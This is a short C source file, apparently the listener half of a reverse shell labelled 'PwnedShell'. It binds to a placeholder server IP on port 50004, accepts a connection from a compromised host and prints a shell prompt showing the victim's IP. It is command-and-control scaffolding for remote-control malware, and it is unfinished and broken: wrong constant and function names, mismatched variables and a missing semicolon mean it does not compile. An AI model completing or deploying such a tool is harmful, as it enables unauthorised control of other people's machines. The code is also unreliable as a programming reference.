#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>


int main() {

    // Prepping server socket items
    int sock, client_socket; // store our (server) socket and to store the client socket once connected
    char buffer[1024];
    char response[18384];
    struct sockaddr_in server_address, client_address;
    int i = 0;
    int optVal = 1;
    socklen_t client_length;

    // initing the socket
    sock = socket(AF_INET, SOCK_STREAM, 0);

    // socket error
    if (setsockopt(sock, SOL_SOCKET, SOL_REUSEADDR, &optval, sizeOf(optval)) < 0) {
        printf("Error setting tcp socket options\n");
        return 1;

    }

    // cont'd setting server socket items
    server_address.sin_family = AF_INET;
    server_address.sin.s_addr = inet_addr("<SERVER_IP>"); // REPLACE!!!
    server_address.sin_port = htons(50004);

    // set up and start the connection
    bind(sock, (struct sockaddr *) &server_address, sizeOf(server_address));
    listen(sock, 5);
    client_length = sizeOf(client_address);
    client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);


    while (1) {
        jump:
            // zero out variables
            bzero(&buffer, sizeOf(buffer));
            bzero(&response, sizeOf(response))
            printf("* PwnedShell#%s~$ ", inet_ntoa(client_address.sin_addr)); // will print shell-like command line with the machine's IP in place of the %s
            fgets(buffer, sizeOf(buffer), stdin);
    }

}